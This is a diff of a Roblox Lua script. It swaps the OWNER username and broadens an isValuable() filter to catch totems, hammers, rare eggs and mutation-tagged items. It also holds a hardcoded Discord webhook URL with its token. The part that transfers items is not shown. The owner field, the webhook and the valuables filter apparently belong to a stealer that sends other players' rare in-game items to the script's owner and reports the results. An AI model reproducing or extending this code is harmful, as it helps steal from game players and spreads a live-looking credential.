@@ -2,19 +2,34 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "frogman_bacon"
+local OWNER = "werovasquez"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
 local function isValuable(name)
-    if name:lower():find("totem") then return true end
-    if name:lower():find("grail") then return true end
-    if name:lower():find("stopwatch") then return true end
+    local lower = name:lower()
+    
+    -- Totems are always valuable
+    if lower:find("totem") then return true end
+    
+    -- Hatch Hammers (especially Gilded)
+    if lower:find("hatch hammer") or lower:find("hammer") then return true end
+    
+    -- Rare/Secret Capybaras
+    if lower:find("secret") or lower:find("mythic") or lower:find("ascended") or lower:find("divine") then return true end
+    
+    -- Rare eggs
+    if lower:find("egg") and (lower:find("secret") or lower:find("rare") or lower:find("mythic") or lower:find("ghost")) then return true end
+    
+    -- Mutated/Special items
+    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","golem"}) do
+        if lower:find(mut) then return true end
+    end
+    
+    -- Items with multipliers (like [1.5x])
     local mult = name:match("%[([%d%.]+)x%]")
     if mult and tonumber(mult) >= MIN_MULT then return true end
-    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine"}) do
-        if name:lower():find("%[" .. mut .. "%]") then return true end
-    end
+    
     return false
 end
 
